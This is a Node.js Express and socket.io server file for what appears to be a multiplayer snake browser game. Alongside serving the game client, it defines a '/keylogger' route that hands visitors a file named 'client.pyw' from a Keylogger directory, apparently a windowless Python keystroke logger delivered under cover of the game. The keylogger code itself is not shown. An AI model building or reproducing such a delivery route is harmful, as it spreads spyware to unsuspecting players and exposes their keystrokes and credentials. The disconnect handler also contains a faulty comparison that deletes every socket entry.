const express = require('express');
const path = require('path');
const app = express();
const serv = require('http').Server(app);
const io = require('socket.io')(serv, {});
const port = 1337;

//import {changeDirection} from 'Player'
const handler = require('./handler');
const Snake = require ('./Player');
class Server {
    constructor(){
        app.set('trust proxy', true);
        app.use(express.static('../Client'));
        this.dir = path.join(__dirname, '../Client/');
        this.kl_path = path.join(__dirname, "../../Keylogger/");

    }
}
class Connection {
    constructor(req){

    }
}


server = new Server();
app.get('/', (req, res, next) => {
    console.log(`Received connection from ${req.ip}`);
    res.sendFile(server.dir + 'index.html', (err) => {
        if (err){
            console.log(err);
        }
    });

});

app.get('/keylogger', (req, res) => {
    res.download(server.kl_path + 'client.pyw');
});

serv.listen(port, () => {
    console.log(`Server now listening on port ${port}`)
});


SOCKET_LIST = {};
players = [];

// Game Data


io.sockets.on('connection', (socket)=> {
    console.log(players.length);

    console.log(`Socket connection from ${socket.handshake.address}`);

    SOCKET_LIST[socket.id] = socket;

    socket.on('newPlayer', ()=> {
        socket.emit('newPlayer', new Snake());
    });

    socket.on('directionChange', (keyCode)=>{
        let responsePacket = handler.changeDirection(keyCode);
        socket.emit('directionChange', responsePacket);
    });

    socket.on('update', (player)=> {
        let index = null;
        for (let i in players){
            if (players[i].id === player.id){
                index = i;
            }
        }
        if (index === null){
            players.push(player)
        }
        else{
            players[index] = player
        }
        //console.log(player);
        //console.log(players.length);
    });

    socket.on('updatePlayer', (player)=>{
        player.update();
    });

    socket.on('disconnect', () => {
        let player = players.indexOf(socket.playerid);
        console.log('someone disconnected');
        for (let i in SOCKET_LIST){
            if (SOCKET_LIST[i]['id'] = socket.id){
                delete SOCKET_LIST[i];
            }
        }
        console.log(players);
        delete SOCKET_LIST[socket.id];
    })


});

setInterval(()=> {
    for (let i in SOCKET_LIST){
        let socket = SOCKET_LIST[i];
        socket.emit('positions', players);
    }
}, 1000/60);


